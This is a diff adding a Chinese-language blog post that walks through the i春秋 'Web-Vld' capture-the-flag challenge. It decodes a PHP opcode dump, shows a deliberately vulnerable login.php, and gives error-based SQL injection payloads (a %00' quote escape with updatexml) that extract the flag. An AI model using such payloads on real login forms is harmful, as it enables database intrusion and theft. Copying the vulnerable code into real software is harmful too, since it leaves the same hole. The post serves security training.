@@ -1,0 +1,319 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>i春秋:Web-Vld - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="扫描后台发现index.php,txt
+Finding entry points
+Branch analysis from position: 0
+Jump found. Position 1 = ,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">i春秋:Web-Vld</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">i春秋:Web-Vld</h1>
+        <div class="stuff">
+            <span>四月 30, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/i%E6%98%A5%E7%A7%8B/" rel="tag">i春秋</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>扫描后台发现index.php,txt</p>
+<pre><code>Finding entry points
+Branch analysis from position: 0
+Jump found. Position 1 = 23, Position 2 = 38
+Branch analysis from position: 23
+Jump found. Position 1 = 26, Position 2 = 35
+Branch analysis from position: 26
+Jump found. Position 1 = 29, Position 2 = 32
+Branch analysis from position: 29
+Jump found. Position 1 = 34
+Branch analysis from position: 34
+Jump found. Position 1 = 37
+Branch analysis from position: 37
+Jump found. Position 1 = 40
+Branch analysis from position: 40
+Return found
+Branch analysis from position: 32
+Jump found. Position 1 = 37
+Branch analysis from position: 37
+Branch analysis from position: 35
+Jump found. Position 1 = 40
+Branch analysis from position: 40
+Branch analysis from position: 38
+Return found
+filename:       C:\ctf\index.php
+function name:  (null)
+number of ops:  44
+compiled vars:  !0 = $a, !1 = $b, !2 = $c
+line     # *  op                           fetch          ext  return  operands
+---------------------------------------------------------------------------------
+   2     0  &gt;   EXT_STMT
+         1      ECHO                                                     'do+you+know+Vulcan+Logic+Dumper%3F%3Cbr%3E'
+   3     2      EXT_STMT
+         3      BEGIN_SILENCE                                    ~0
+         4      FETCH_R                      global              $1      '_GET'
+         5      FETCH_DIM_R                                      $2      $1, 'flag1'
+         6      END_SILENCE                                              ~0
+         7      ASSIGN                                                   !0, $2
+   4     8      EXT_STMT
+         9      BEGIN_SILENCE                                    ~4
+        10      FETCH_R                      global              $5      '_GET'
+        11      FETCH_DIM_R                                      $6      $5, 'flag2'
+        12      END_SILENCE                                              ~4
+        13      ASSIGN                                                   !1, $6
+   5    14      EXT_STMT
+        15      BEGIN_SILENCE                                    ~8
+        16      FETCH_R                      global              $9      '_GET'
+        17      FETCH_DIM_R                                      $10     $9, 'flag3'
+        18      END_SILENCE                                              ~8
+        19      ASSIGN                                                   !2, $10
+   6    20      EXT_STMT
+        21      IS_EQUAL                                         ~12     !0, 'fvhjjihfcv'
+        22    &gt; JMPZ                                                     ~12, -&gt;38
+   7    23  &gt;   EXT_STMT
+        24      IS_EQUAL                                         ~13     !1, 'gfuyiyhioyf'
+        25    &gt; JMPZ                                                     ~13, -&gt;35
+   8    26  &gt;   EXT_STMT
+        27      IS_EQUAL                                         ~14     !2, 'yugoiiyhi'
+        28    &gt; JMPZ                                                     ~14, -&gt;32
+   9    29  &gt;   EXT_STMT
+        30      ECHO                                                     'the+next+step+is+xxx.zip'
+  10    31    &gt; JMP                                                      -&gt;34
+  11    32  &gt;   EXT_STMT
+        33      ECHO                                                     'false%3Cbr%3E'
+  13    34  &gt; &gt; JMP                                                      -&gt;37
+  14    35  &gt;   EXT_STMT
+        36      ECHO                                                     'false%3Cbr%3E'
+  16    37  &gt; &gt; JMP                                                      -&gt;40
+  17    38  &gt;   EXT_STMT
+        39      ECHO                                                     'false%3Cbr%3E'
+  19    40  &gt;   NOP
+  22    41      EXT_STMT
+        42      ECHO                                                     '%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A'
+        43    &gt; RETURN                                                   1
+
+branch: #  0; line:     2-    6; sop:     0; eop:    22; out1:  23; out2:  38
+branch: # 23; line:     7-    7; sop:    23; eop:    25; out1:  26; out2:  35
+branch: # 26; line:     8-    8; sop:    26; eop:    28; out1:  29; out2:  32
+branch: # 29; line:     9-   10; sop:    29; eop:    31; out1:  34
+branch: # 32; line:    11-   13; sop:    32; eop:    33; out1:  34
+branch: # 34; line:    13-   13; sop:    34; eop:    34; out1:  37
+branch: # 35; line:    14-   16; sop:    35; eop:    36; out1:  37
+branch: # 37; line:    16-   16; sop:    37; eop:    37; out1:  40
+branch: # 38; line:    17-   19; sop:    38; eop:    39; out1:  40
+branch: # 40; line:    19-   22; sop:    40; eop:    43
+path #1: 0, 23, 26, 29, 34, 37, 40,
+path #2: 0, 23, 26, 32, 34, 37, 40,
+path #3: 0, 23, 35, 37, 40,
+path #4: 0, 38, 40,
+do you know Vulcan Logic Dumper?&lt;br&gt;false&lt;br&gt;&lt;!-- index.php.txt ?&gt;</code></pre>
+<p>为php opcodes，需要对其编译，</p>
+<p>参照：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wosun/p/11386434.html">https://www.cnblogs.com/wosun/p/11386434.html</a></p>
+<p><img src="https://img2018.cnblogs.com/blog/1712230/201908/1712230-20190820233057014-1821050049.png" alt="img"></p>
+<p>所以flag应满足三个条件：</p>
+<p>然后访问1chunqiu.zip</p>
+<p>其中login.php中存在注入漏洞：</p>
+<pre><code>&lt;?php
+
+require_once 'dbmysql.class.php';
+require_once 'config.inc.php';
+
+if(isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; isset($_POST['number'])){
+    $db = new mysql_db();
+    $username = $db-&gt;safe_data($_POST['username']);
+    $password = $db-&gt;my_md5($_POST['password']);
+    $number = is_numeric($_POST['number']) ? $_POST['number'] : 1;
+
+    $username = trim(str_replace($number, '', $username));
+
+    $sql = "select * from"."`".table_name."`"."where username="."'"."$username"."'";
+    $row = $db-&gt;query($sql);
+    $result = $db-&gt;fetch_array($row);
+    if($row){
+        if($result["number"] === $number &amp;&amp; $result["password"] === $password){
+            echo "&lt;script&gt;alert('nothing here!')&lt;/script&gt;";
+        }else{
+            echo "&lt;script&gt;
+            alert('密码错误，老司机翻车了!');
+            function jumpurl(){
+                location='login.html';
+            }
+            setTimeout('jumpurl()',1000);
+            &lt;/script&gt;";
+        }
+    }else{
+        exit(mysql_error());
+    }
+}else{
+    echo "&lt;script&gt;
+            alert('用户名密码不能为空!');
+            function jumpurl(){
+                location='login.html';
+            }
+            setTimeout('jumpurl()',1000);
+        &lt;/script&gt;";
+}
+
+
+ ?&gt;</code></pre>
+<p>其中username存在addslashes()处理（单引号，反斜杠等前面都会被加上反斜杠而转义，防御sql注入），单伤下面又存在$username = trim(str_replace($number, ‘’, $username));所以这里可以注入。</p>
+<p>将number的值改为0，username的值改为%00’出现报错（%00‘ ，经过addslashes()处理后（addslashes()会在NULL前加 \ ,0等于NULL）是 \0\‘）</p>
+<p>去掉0则会变成\’就让我们的单引号没有被注释</p>
+<p>后台的执行语句就变成了select * from<code>users</code>where username=‘ \ ‘ ‘ 所以会报错</p>
+<p>再根据1chunqiu.zip中的config.inc.php给的数据库信息一步一步报错查询下去得到flag</p>
+<p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190902165656831-1580248640.png" alt="img"></p>
+<pre><code>%00'and updatexml(1,substr((select flag from flag),1,41),1)#
+%00'and updatexml(1,substr((select flag from flag),12,41),1)#</code></pre>
+<p><img src="/2021/04/30/i-chun-qiu-web-vld/de1f20c61a02d4c5739cf5e772066e9.png" alt="de1f20c61a02d4c5739cf5e772066e9"></p>
+<p><img src="/2021/04/30/i-chun-qiu-web-vld/d7b9e103ac86ed98b291be7d6cf8437.png" alt="d7b9e103ac86ed98b291be7d6cf8437"></p>
+<pre><code>flag{a7758b35-61e7-484e-85f8-edffb5059625}</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+				
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
